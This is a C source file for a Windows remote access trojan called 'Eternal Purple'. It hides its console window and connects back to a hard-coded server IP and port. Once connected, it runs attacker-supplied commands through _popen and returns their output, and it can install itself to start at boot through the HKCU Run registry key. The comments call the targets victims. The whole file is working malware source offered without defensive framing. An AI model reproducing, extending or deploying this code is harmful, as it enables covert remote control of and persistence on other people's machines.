#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <winuser.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

//Function that sets variable to 0 Used to reinitialize buff and other arrays
#define bzero(p, size) (void) memset ((p), 0, (size))


int sock;
unsigned short ServPort = 50005;//Server Port
char *ServIP  = "192.168.174.129";//Server IP
int zombie_bool = 0;//If shell mode is enabled

void zombie(){
	closesocket(sock);
}

//BOOTRUN used to enable persistance on victims machine(autorun on boot)
int bootRun(){
	//Output Strings declaration
	char err[128] = "Failed\n";//Error String
	char suc[128] = "Created Persistance at \\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n";//Success output string
	TCHAR szPath[MAX_PATH];
	DWORD pathLen = 0;
	
	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);//get path to our malware
	if (pathLen == 0) {
		send(sock, err, sizeof(err),0);
		return -1;
	}

	HKEY NewVal;//Handle to an open registrty key
	
	if(RegOpenKey(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),&NewVal) != ERROR_SUCCESS){
		send(socket, err, sizeof(err),0);
		return -1;
	}

	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
	if(RegSetValueEx(NewVal, TEXT("Eternal Purple"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS){
		RegCloseKey(NewVal);
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	//If everything checks out fine Close the key and send success mesage to server
	RegCloseKey(NewVal);
	send(sock,suc, sizeof(suc),0);
	return 0;
}

//STRCUT used for cuting aruents out of commands
//pre: String str is a char array containing string to cut, slice from is the position from wich we will cut, slice to is the position final character
//post: Returns pointer to char array wich contains cut string
char *
str_cut(char str[], int slice_from, int slice_to){
	if (str[0] == '\0') return NULL;
	char *buffer;
	size_t str_len, buffer_len;

	if(slice_to < 0 && slice_from > slice_to){
		str_len = strlen(str);
		if (abs(slice_to) > str_len - 1)
			return NULL;

		if (abs(slice_from) > str_len)
			slice_from = (-1) * str_len;

		buffer_len = slice_to - slice_from;
		str += (str_len + slice_from);

	}else if (slice_from >= 0 && slice_to > slice_from){
		str_len = strlen(str);

		if (slice_from > str_len - 1)
			return NULL;

		buffer_len = slice_to - slice_from;
		str += slice_from;
	} else
		return NULL;

	buffer = calloc(buffer_len, sizeof(char));
	strncpy(buffer, str, buffer_len);
	return buffer;
}

//Main Function wich is called
void Shell(){ //Once connected execute custom commands or bash
	char buffer[1024];
	char container[1024];
	char total_response[18384];
	int sh_bool = 1;
	while (sh_bool == 1) {
 		 jump:
		 bzero(buffer,1024);
		 bzero(container, sizeof(container));
		 bzero(total_response, sizeof(total_response));
		 recv(sock, buffer, 1024, 0);
		//-----ETERNALPURPLE-COMMANDS------
		if (strncmp("q", buffer, 1) == 0) {//Use "q" to quit
			 closesocket(sock);
			 WSACleanup();
			 exit(0);
    		}
		else if(strncmp("cd ",buffer,3) == 0){//Use cd to change directory
			chdir(str_cut(buffer,3,100));
		}
		else if(strncmp("persist", buffer, 7) == 0){//Use "persist" to try enable boot run
			bootRun();
		}
		else if(strncmp("zombie", buffer, 6) == 0){//Use "zombie" to background current session
			char zomb[128] = "Zombie Mode Enabled \n";
			send(sock, zomb, sizeof(zomb),0);
			zombie_bool= 1;
			sh_bool = 0;
		}
		else if(strncmp("panic", buffer, 5) == 0){//Use "panic" to clean up all tracks and terminate connection
			char panic[128] = "Cleaning Up and Exiting ... \n";
			send(sock, panic, sizeof(panic),0);
		}
    		else {	//Else send raw data
			FILE *fp; //Create File descriptor
			fp = _popen(buffer, "r"); // open a process and execute command from buffer (r = read)
			while(fgets(container,1024,fp) != NULL) { //Fgets streams data from a variable to another one fp -> container. Get 1024B and  concatenate them into total_response .if there is still data in fp, repeat loop
				strcat(total_response, container);
        		}
			send(sock, total_response, sizeof(total_response), 0);//once total response is filled send the data to the Attackers Machine
			fclose(fp);//Close file descriptor fd used to get command return
    		}
	}
}
void connect_victim(){

	struct sockaddr_in ServAddr;

	WSADATA wsaData;
	if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0){
		exit(1);//Error control
	}
	sock = socket(AF_INET, SOCK_STREAM, 0);
	memset(&ServAddr, 0, sizeof(ServAddr));
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);
	//3) TRY TO CONNECT
	start:
	while( connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0){
		Sleep(30);
		goto start;
	}

}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
	//1) HIDE PROCESS FROM TARGET
	HWND stealth;
	AllocConsole();
	stealth = FindWindow("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
	do{
		//2) DEFINE NETWORKNG STUFF NEEDED (PORT & IP)
		connect_victim();
		//4)If connection was succesful  EXECUTE SHELL funciont (main functionalities) 
		Shell();
	}while(zombie_bool==1);
	//End of execution
	exit(0);
}
